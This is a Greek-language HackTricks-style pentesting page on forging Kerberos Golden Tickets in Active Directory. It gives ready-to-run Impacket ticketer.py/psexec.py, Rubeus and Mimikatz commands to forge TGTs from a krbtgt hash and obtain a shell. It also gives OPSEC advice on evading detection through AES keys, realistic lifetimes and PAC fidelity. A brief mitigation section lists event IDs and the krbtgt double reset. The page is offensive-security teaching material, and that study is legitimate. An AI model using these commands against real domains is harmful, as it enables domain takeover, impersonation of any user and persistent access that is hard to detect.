# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

Μια επίθεση **Golden Ticket** αποτελείται από τη **δημιουργία ενός νόμιμου Ticket Granting Ticket (TGT) που υποδύεται οποιονδήποτε χρήστη**, μέσω της χρήσης του **NTLM hash του λογαριασμού Active Directory (AD) krbtgt**. Αυτή η τεχνική είναι ιδιαίτερα πλεονεκτική, επειδή **επιτρέπει την πρόσβαση σε οποιαδήποτε υπηρεσία ή μηχάνημα** εντός του domain ως ο χρήστης που υποδύεστε. Είναι κρίσιμο να θυμάστε ότι τα **credentials του λογαριασμού krbtgt δεν ενημερώνονται ποτέ αυτόματα**.<sup>[[1]](#references)</sup>

Για την **απόκτηση του NTLM hash** του λογαριασμού krbtgt, μπορούν να χρησιμοποιηθούν διάφορες μέθοδοι. Μπορεί να εξαχθεί από τη **διεργασία Local Security Authority Subsystem Service (LSASS)** ή από το **αρχείο NT Directory Services (NTDS.dit)** που βρίσκεται σε οποιονδήποτε Domain Controller (DC) εντός του domain. Επιπλέον, η **εκτέλεση μιας επίθεσης DCsync** αποτελεί άλλη μία στρατηγική για την απόκτηση αυτού του NTLM hash και μπορεί να πραγματοποιηθεί με εργαλεία όπως το **lsadump::dcsync module** του Mimikatz ή το **secretsdump.py script** του Impacket. Είναι σημαντικό να τονιστεί ότι, για την εκτέλεση αυτών των ενεργειών, απαιτούνται συνήθως **δικαιώματα domain admin ή αντίστοιχο επίπεδο πρόσβασης**.<sup>[[2]](#references)</sup>

Παρότι το NTLM hash αποτελεί μια κατάλληλη μέθοδο για αυτόν τον σκοπό, **συνιστάται έντονα** να **πλαστογραφείτε tickets χρησιμοποιώντας τα Advanced Encryption Standard (AES) Kerberos keys (AES128 και AES256)** για λόγους operational security. Αυτό είναι ακόμη πιο σημαντικό στα σύγχρονα domains, επειδή η **χρήση του RC4 σταδιακά καταργείται** και ξεχωρίζει πολύ πιο καθαρά στα Kerberos telemetry δεδομένα.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Σύγχρονες σημειώσεις δημιουργίας ticket

Όταν είναι δυνατό, κάντε πρώτα **query στο LDAP και στο SYSVOL** και, στη συνέχεια, forge το ticket χρησιμοποιώντας την πραγματική policy του domain και τις τιμές PAC του user, αντί να τις επινοείτε χειροκίνητα:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` ζητά από το DC τα δεδομένα χρήστη, ομάδας, NetBIOS και policy που χρησιμοποιούνται για τη δημιουργία ενός πιο ρεαλιστικού PAC.
- `/printcmd` εκτυπώνει μια offline γραμμή εντολών που περιέχει τα ανακτημένα πεδία του PAC, κάτι χρήσιμο αν αργότερα θέλετε να κάνετε forge το ίδιο ticket χωρίς να αγγίξετε ξανά το LDAP.
- `/extendedupndns` προσθέτει τα νεότερα στοιχεία `UpnDns` του PAC, τα οποία περιέχουν τα `samAccountName` και SID του account.
- `/oldpac` αφαιρεί τα νεότερα buffers `Requestor` και `Attributes` του PAC. Αυτό είναι κυρίως χρήσιμο για compatibility testing σε παλαιότερα environments και όχι ως προεπιλεγμένο tradecraft.

Από Linux, οι πρόσφατες εκδόσεις του Impacket υποστηρίζουν επίσης την προσθήκη των νεότερων PAC structures και τον ορισμό μιας ρεαλιστικής περιόδου ισχύος:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- Το `-duration` είναι σε **ώρες**. Η προεπιλογή είναι **10 χρόνια**, κάτι που είναι θορυβώδες.
- Το `-extra-pac` προσθέτει τις νεότερες πληροφορίες `UPN_DNS` του PAC.
- Το `-old-pac` επιβάλλει τη legacy διάταξη PAC.
- Το `-extra-sid` είναι χρήσιμο όταν το PAC χρειάζεται επιπλέον SIDs (για παράδειγμα, σε σενάρια escalation από child σε parent, τα οποία καλύπτονται στο [SID-History Injection](sid-history-injection.md)).

**Αφού** έχεις κάνει inject το **golden Ticket**, μπορείς να αποκτήσεις πρόσβαση στα shared files **(C$)** και να εκτελέσεις services και WMI, επομένως μπορείς να χρησιμοποιήσεις **psexec** ή **wmiexec** για να αποκτήσεις ένα shell (φαίνεται ότι δεν μπορείς να αποκτήσεις shell μέσω winrm).

### Παράκαμψη συνηθισμένων detections

Οι συχνότεροι τρόποι εντοπισμού ενός golden ticket είναι μέσω **επιθεώρησης της κίνησης Kerberos** στο δίκτυο. Από προεπιλογή, το Mimikatz **υπογράφει το TGT για 10 χρόνια**, κάτι που θα ξεχωρίζει ως anomalous σε επόμενα TGS requests που γίνονται με αυτό.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Χρησιμοποίησε τις παραμέτρους `/startoffset`, `/endin` και `/renewmax` για να ελέγξεις το start offset, τη διάρκεια και τον μέγιστο αριθμό renewals (όλα σε λεπτά).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Δυστυχώς, η διάρκεια ζωής του TGT δεν καταγράφεται στα 4769, επομένως δεν θα βρείτε αυτή την πληροφορία στα Windows event logs. Ωστόσο, αυτό που μπορείτε να συσχετίσετε είναι **η εμφάνιση 4769 χωρίς προηγούμενο 4768**. **Δεν είναι δυνατή η αίτηση ενός TGS χωρίς TGT** και, αν δεν υπάρχει καταγραφή έκδοσης TGT, μπορούμε να συμπεράνουμε ότι έγινε forge offline.

Σε **νεότερα Windows builds**, τα Event IDs **4768** και **4769** παρέχουν επίσης πολύ καλύτερο **encryption type telemetry**. Ένα forged TGT/TGS που χρησιμοποιεί **RC4 (`0x17`)** σε domain όπου τα `krbtgt`, clients και services διαθέτουν ήδη AES keys εντοπίζεται πολύ πιο εύκολα απ' ό,τι πριν από μερικά χρόνια. Αυτός είναι ένας ακόμη λόγος για να προτιμάτε **AES-backed Golden Tickets** και να ακολουθείτε όσο το δυνατόν πιο πιστά τη συνήθη Kerberos policy του domain.

Ένα ακόμη ζήτημα OPSEC είναι η **PAC fidelity**. Tickets με αδύνατες group memberships, ελλείποντα νεότερα PAC buffers ή account metadata που δεν ταιριάζουν με το LDAP εντοπίζονται ευκολότερα όταν οι defenders επικυρώνουν τα περιεχόμενα του PAC με βάση τα δεδομένα του AD. Αν χρειάζεστε ένα TGT που να φαίνεται ότι εκδόθηκε πραγματικά από DC, δείτε:

{{#ref}}
diamond-ticket.md
{{#endref}}

Υπάρχουν επίσης **περιβαλλοντικοί περιορισμοί** στην persistence. Ο λογαριασμός `krbtgt` διατηρεί **password history με 2 τιμές**, επομένως ένα forged TGT μπορεί να παραμείνει έγκυρο μετά το **πρώτο** reset του `krbtgt`, αν είχε υπογραφεί με το προηγούμενο key. Γι' αυτό οι defenders ακυρώνουν τα Golden Tickets κάνοντας **reset του `krbtgt` δύο φορές** και περιμένοντας τουλάχιστον όσο διαρκεί το μέγιστο ticket lifetime του domain μεταξύ των resets.<sup>[[3]](#references)</sup>

Για να **παρακάμψετε αυτόν τον έλεγχο εντοπισμού**, ελέγξτε τα diamond tickets.

### Μετριασμός

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Άλλα μικρά tricks που μπορούν να εφαρμόσουν οι defenders είναι να **δημιουργούν alert για 4769 σε sensitive users**, όπως ο προεπιλεγμένος domain administrator account, και να δημιουργούν alert για **χρήση RC4 από το `krbtgt`** σε domains που κανονικά εκδίδουν AES tickets.<sup>[[5]](#references)</sup>

## References

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
